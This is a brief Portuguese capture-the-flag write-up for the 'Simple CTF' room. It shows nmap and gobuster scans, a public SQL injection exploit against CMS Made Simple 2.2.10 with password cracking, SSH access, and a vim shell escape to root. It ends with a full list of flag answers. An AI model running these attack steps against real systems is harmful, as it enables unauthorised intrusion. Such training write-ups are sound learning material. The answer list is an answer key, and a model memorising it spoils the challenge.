CTF SIMPLE-CTF

Ao gerar o IP dei o comando:
    
    nmap -A "ip"

que mostrou as duas primeiras flags.

<br>

Apos isso usando a ferramenta Gobuster mostrou que o ip tinha um /simple que era uma aplicacao web, ao entrar vimos a versao que foi feita("CMS 2.2.10") ao procurar exploits encotrei um sql injection assim descobrindo mais duas flags.


     gobuster dir -u http://10.10.250.145/ -w directory-list-2.3-medium.txt -t 100


Ao rodar o script em python na aplicacao web era possivel encontrar o user mitch e sua senha. Ao entrar no usuario mitch pelo ssh tinhamos acesso a mais uma flag em um arquivo .txt

    $ python2 46635.py -u http://10.10.250.145/simple/ --crack -w /usr/share/wordlists/rockyou.txt


Em seguida usamos o reverseshell conseguimos ter acesso root e ler a pasta root e concluindo o desafio.

    vim -c ':!/bin/sh'


FLAGS

    Flag 1: 2
    Flag 2: ssh
    Flag 3: CVE-2019-9053
    Flag 4: sqli
    Flag 5: secret
    Flag 6: ssh
    Flag 7: G00d j0b, keep up!
    Flag 8: sunbath
    Flag 9: vim
    Flag 10: W3ll d0n3. You made it!


